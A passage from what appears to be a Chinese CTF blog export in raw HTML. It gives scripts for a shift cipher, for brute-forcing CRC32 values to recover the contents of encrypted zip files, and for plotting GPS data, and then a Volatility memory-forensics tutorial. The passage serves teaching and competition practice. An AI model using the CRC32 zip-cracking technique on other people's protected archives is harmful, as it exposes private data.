class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="移位密码加解密"><a href="#移位密码加解密" class="headerlink" title="移位密码加解密"></a>移位密码加解密</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># 加密</span>    right_move <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入右移位数：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入需要加密的字符串：'</span><span class="token punctuation">)</span>    list_s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        list_s<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> list_s<span class="token punctuation">:</span>        <span class="token comment"># 处理空格</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token comment"># 对大写字母进行处理</span>        <span class="token keyword">elif</span> <span class="token number">65</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>            i <span class="token operator">+=</span> right_move            <span class="token keyword">while</span> i <span class="token operator">></span> <span class="token number">90</span><span class="token punctuation">:</span>                i <span class="token operator">-=</span> <span class="token number">26</span>        <span class="token comment"># 对小写字母进行处理</span>        <span class="token keyword">elif</span> <span class="token number">97</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">:</span>            i <span class="token operator">+=</span> right_move            <span class="token keyword">while</span> i <span class="token operator">></span> <span class="token number">122</span><span class="token punctuation">:</span>                i <span class="token operator">-=</span> <span class="token number">26</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># 解密</span>    left_move <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入左移位数：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入需要解密的字符串：'</span><span class="token punctuation">)</span>    list_s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        list_s<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> list_s<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token number">65</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;=</span> <span class="token number">90</span><span class="token punctuation">:</span>            i <span class="token operator">-=</span> left_move            <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">65</span><span class="token punctuation">:</span>                i <span class="token operator">+=</span> <span class="token number">26</span>        <span class="token keyword">elif</span> <span class="token number">97</span> <span class="token operator">&lt;=</span> i <span class="token operator">&lt;=</span> <span class="token number">122</span><span class="token punctuation">:</span>            i <span class="token operator">-=</span> left_move            <span class="token keyword">while</span> i <span class="token operator">&lt;</span> <span class="token number">97</span><span class="token punctuation">:</span>                i <span class="token operator">+=</span> <span class="token number">26</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"              移位密码                "</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请输入所需的操作："</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"1.编码（E/e） |  2.解码（D/d）"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'你的选择：'</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> choice<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'E'</span> <span class="token keyword">or</span> choice<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'e'</span> <span class="token keyword">or</span> choice<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>    encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">elif</span> choice<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'D'</span> <span class="token keyword">or</span> choice<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'d'</span> <span class="token keyword">or</span> choice<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>    decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入错误！'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="CRC32-爆破"><a href="#CRC32-爆破" class="headerlink" title="CRC32 爆破"></a>CRC32 爆破</h1><blockquote><p>参考自 <a href="https://mochu.blog.csdn.net/" title="末 初">末 初</a> 师傅的文献：<a href="https://mochu.blog.csdn.net/article/details/110206427">浅谈使用Python脚本爆破CRC32</a></p><p><strong>当 zip 压缩包中出现多个类似于 flag.txt 的加密文件时，可考虑 CRC32 爆破</strong></p></blockquote><h2 id="获取文件的-CRC-值"><a href="#获取文件的-CRC-值" class="headerlink" title="获取文件的 CRC 值"></a>获取文件的 CRC 值</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfilefile_handler <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span><span class="token string">'./password.zip'</span><span class="token punctuation">)</span>   <span class="token comment"># 指定压缩包</span>name_list <span class="token operator">=</span> file_handler<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># 使用一个列表获取压缩包内所有的文件名</span>crc_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------Filename CRC Info-------------'</span><span class="token punctuation">)</span><span class="token keyword">for</span> name <span class="token keyword">in</span> name_list<span class="token punctuation">:</span>    name_info <span class="token operator">=</span> file_handler<span class="token punctuation">.</span>getinfo<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    crc_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name_info<span class="token punctuation">.</span>CRC<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;0&#125;: &#123;1&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>name_info<span class="token punctuation">.</span>CRC<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------------------------------------'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>crc_list<span class="token punctuation">)</span>   <span class="token comment"># 根据情况获取，有时并压缩包内可能还有其他文件，可能需要切片，所以择情况选取</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>文件的 CRC 值也可以直接使用解压软件进行查看，但如果无法复制粘贴，可以使用此脚本获取</p></blockquote><hr><h2 id="1-字节爆破"><a href="#1-字节爆破" class="headerlink" title="1 字节爆破"></a>1 字节爆破</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">crack_crc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------Start Crack CRC-------------'</span><span class="token punctuation">)</span>    crc_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xda6fd2a0</span><span class="token punctuation">,</span> <span class="token number">0xf6a70</span><span class="token punctuation">,</span> <span class="token number">0x70659eff</span><span class="token punctuation">,</span> <span class="token number">0x862575d</span><span class="token punctuation">]</span>   <span class="token comment"># 文件的 CRC32 值列表，注意顺序</span>    comment <span class="token operator">=</span> <span class="token string">''</span>    chars <span class="token operator">=</span> string<span class="token punctuation">.</span>printable    <span class="token keyword">for</span> crc_value <span class="token keyword">in</span> crc_list<span class="token punctuation">:</span>        <span class="token keyword">for</span> char1 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            char_crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>char1<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 获取遍历字符的 CRC32 值</span>            calc_crc <span class="token operator">=</span> char_crc <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>   <span class="token comment"># 将获取到的字符的 CRC32 值与 0xffffffff 进行与运算</span>            <span class="token keyword">if</span> calc_crc <span class="token operator">==</span> crc_value<span class="token punctuation">:</span>   <span class="token comment"># 将每个字符的CRC32值与每个文件的 CRC32 值进行匹配</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125;: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>crc_value<span class="token punctuation">)</span><span class="token punctuation">,</span>char1<span class="token punctuation">)</span><span class="token punctuation">)</span>                comment <span class="token operator">+=</span> char1    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----------CRC Crack Completed-----------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Result: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    crack_crc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="2-字节爆破"><a href="#2-字节爆破" class="headerlink" title="2 字节爆破"></a>2 字节爆破</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">crack_crc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------Start Crack CRC-------------'</span><span class="token punctuation">)</span>    crc_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xef347b51</span><span class="token punctuation">,</span> <span class="token number">0xa8f1b31e</span><span class="token punctuation">,</span> <span class="token number">0x3c053787</span><span class="token punctuation">,</span> <span class="token number">0xbbe0a1b</span><span class="token punctuation">]</span>   <span class="token comment"># 文件的 CRC32 值列表，注意顺序</span>    comment <span class="token operator">=</span> <span class="token string">''</span>    chars <span class="token operator">=</span> string<span class="token punctuation">.</span>printable    <span class="token keyword">for</span> crc_value <span class="token keyword">in</span> crc_list<span class="token punctuation">:</span>        <span class="token keyword">for</span> char1 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            <span class="token keyword">for</span> char2 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>                res_char <span class="token operator">=</span> char1 <span class="token operator">+</span> char2   <span class="token comment"># 获取遍历的任意 2Byte 字符</span>                char_crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>res_char<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 获取遍历字符的 CRC32 值</span>                calc_crc <span class="token operator">=</span> char_crc <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>   <span class="token comment"># 将获取到的字符的 CRC32 值与 0xffffffff 进行与运算</span>                <span class="token keyword">if</span> calc_crc <span class="token operator">==</span> crc_value<span class="token punctuation">:</span>   <span class="token comment"># 将获取字符的 CRC32 值与每个文件的 CRC32 值进行匹配</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125;: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>crc_value<span class="token punctuation">)</span><span class="token punctuation">,</span>res_char<span class="token punctuation">)</span><span class="token punctuation">)</span>                    comment <span class="token operator">+=</span> res_char    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----------CRC Crack Completed-----------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Result: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    crack_crc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="3-字节爆破"><a href="#3-字节爆破" class="headerlink" title="3 字节爆破"></a>3 字节爆破</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">crack_crc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-------------Start Crack CRC-------------'</span><span class="token punctuation">)</span>    crc_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x2b17958</span><span class="token punctuation">,</span> <span class="token number">0xafa8f8df</span><span class="token punctuation">,</span> <span class="token number">0xcc09984b</span><span class="token punctuation">,</span> <span class="token number">0x242026cf</span><span class="token punctuation">]</span>   <span class="token comment"># 文件的 CRC32 值列表，注意顺序</span>    comment <span class="token operator">=</span> <span class="token string">''</span>    chars <span class="token operator">=</span> string<span class="token punctuation">.</span>printable    <span class="token keyword">for</span> crc_value <span class="token keyword">in</span> crc_list<span class="token punctuation">:</span>        <span class="token keyword">for</span> char1 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>            <span class="token keyword">for</span> char2 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>                <span class="token keyword">for</span> char3 <span class="token keyword">in</span> chars<span class="token punctuation">:</span>                    res_char <span class="token operator">=</span> char1 <span class="token operator">+</span> char2 <span class="token operator">+</span> char3   <span class="token comment"># 获取遍历的任意 3Byte 字符</span>                    char_crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>res_char<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 获取遍历字符的 CRC32 值</span>                    calc_crc <span class="token operator">=</span> char_crc <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>   <span class="token comment"># 将遍历的字符的 CRC32 值与 0xffffffff 进行与运算</span>                    <span class="token keyword">if</span> calc_crc <span class="token operator">==</span> crc_value<span class="token punctuation">:</span>   <span class="token comment"># 将获取字符的 CRC32 值与每个文件的 CRC32 值进行匹配</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125;: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>crc_value<span class="token punctuation">)</span><span class="token punctuation">,</span>res_char<span class="token punctuation">)</span><span class="token punctuation">)</span>                        comment <span class="token operator">+=</span> res_char    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'-----------CRC Crack Completed-----------'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Result: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>comment<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    crack_crc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="4-6-字节爆破"><a href="#4-6-字节爆破" class="headerlink" title="4 ~ 6 字节爆破"></a>4 ~ 6 字节爆破</h2><blockquote><p>建议使用：<a href="https://github.com/theonlypwner/crc32">CRC32 tools: reverse, undo&#x2F;rewind, and calculate hashes</a></p></blockquote><p>对每一个 txt 文件单独使用命令进行爆破：（如果 txt 文件原始大小为 6，则直接观察解密后的 6 位结果；如果原始大小为 4，则将解密后的 4 字节数据转为 ASCii 码）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python crc32.py reverse 文件的CRC32的值<span class="token punctuation">(</span>加上0x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后将每一个 txt 文件碰撞得到的结果按照文件名顺序拼接起来</p><hr><h1 id="GPS-数据轨迹可视化"><a href="#GPS-数据轨迹可视化" class="headerlink" title="GPS 数据轨迹可视化"></a>GPS 数据轨迹可视化</h1><blockquote><p>在线网站：<a href="https://mygeodata.cloud/converter/">Online GIS&#x2F;CAD Data Converter | SHP, KML, KMZ, TAB, CSV, …</a></p></blockquote><p>GPS 数据格式类似于：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">$GPGGA,090000.00,3039.36980078,N,10406.19723861,E,1,05,2.87,160.00,M,-21.3213,M,,*77$GPGGA,090000.10,3039.37017729,N,10406.19646536,E,1,05,2.87,160.00,M,-21.3213,M,,*7E$GPGGA,090000.20,3039.37054445,N,10406.19571112,E,1,05,2.87,160.00,M,-21.3213,M,,*76<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可视化脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltdata <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'GPS数据文件路径'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> data<span class="token punctuation">:</span>  <span class="token keyword">if</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>d1<span class="token punctuation">,</span> d2 <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">float</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">)</span>x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d1<span class="token punctuation">)</span>y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>   <span class="token comment"># plt.scatter(y, x)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存取证</title>
      <link href="/posts/5090002e.html"/>
      <url>/posts/5090002e.html</url>
      
        <content type="html"><![CDATA[<h1 id="volatility-的安装"><a href="#volatility-的安装" class="headerlink" title="volatility 的安装"></a>volatility 的安装</h1><blockquote><p>Volatility 是一款开源的内存取证分析工具，支持 Windows、Linux、Mac、Android 等多类型操作系统系统的内存取证方式。该工具由 python 开发，<strong>volatility2 支持 python2</strong>、<strong>volatility3 支持 python3</strong> 环境</p></blockquote><ul><li>通过 snap 安装 volatility2</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> volatility-phocean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过 pip 安装 volatility3（需先安装 python3 环境）（推荐）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> volatility3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过 git 安装 volatility3（需先安装 python3 环境）</li></ul><blockquote><p>Github地址：<a href="https://github.com/volatilityfoundation/volatility3">volatility3</a></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/volatilityfoundation/volatility3 /opt/volatility3<span class="token builtin class-name">cd</span> /opt/volatility3pip3 <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt<span class="token function">sudo</span> python3 setup.py build<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token function">sudo</span> python3 vol.py <span class="token parameter variable">-h</span>   <span class="token comment"># 验证安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果使用 <code>pip list</code> 会显示如下信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">DEPRECATION: Loading egg at /usr/local/lib/python3.11/dist-packages/volatility3-2.7.0-py3.11.egg is deprecated. pip <span class="token number">24.3</span> will enforce this behaviour change. A possible replacement is to use pip <span class="token keyword">for</span> package installation<span class="token punctuation">..</span> Discussion can be found at https://github.com/pypa/pip/issues/12330<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是因为刚刚通过编译安装的是 <code>volatility3-2.7.0-py3.11.egg</code>，但在 pip 24.3 不再支持，不过不影响使用</p><p>如果强迫症，使用 pip 卸载后重装即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip uninstall volatility3pip <span class="token function">install</span> volatility3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="volalitily-的使用"><a href="#volalitily-的使用" class="headerlink" title="volalitily 的使用"></a>volalitily 的使用</h1><blockquote><p>常见的取证文件后缀名为：raw、vmem、img、dmg</p><p>volatility2 使用 <code>volatility</code><br>volatility3 使用 <code>vol</code> 或者 <code>python3 vol.py</code></p></blockquote><h2 id="获取系统基本信息"><a href="#获取系统基本信息" class="headerlink" title="获取系统基本信息"></a>获取系统基本信息</h2><blockquote><p><strong>首先必须通过此命令获取系统版本信息，如果操作系统错误，是无法正确读取内存信息的</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescanvol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> xxxvol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'jpg|png|jpeg|bmp|gif'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 dumpfiles <span class="token parameter variable">-Q</span> 内存地址 --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="列出进程信息"><a href="#列出进程信息" class="headerlink" title="列出进程信息"></a>列出进程信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本  pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="提取进程内容"><a href="#提取进程内容" class="headerlink" title="提取进程内容"></a>提取进程内容</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 memdump <span class="token parameter variable">-p</span> 进程的PID <span class="token parameter variable">-D</span> 保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="获取浏览器浏览历史"><a href="#获取浏览器浏览历史" class="headerlink" title="获取浏览器浏览历史"></a>获取浏览器浏览历史</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="获取内存中的注册表"><a href="#获取内存中的注册表" class="headerlink" title="获取内存中的注册表"></a>获取内存中的注册表</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vol <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hivelist<span 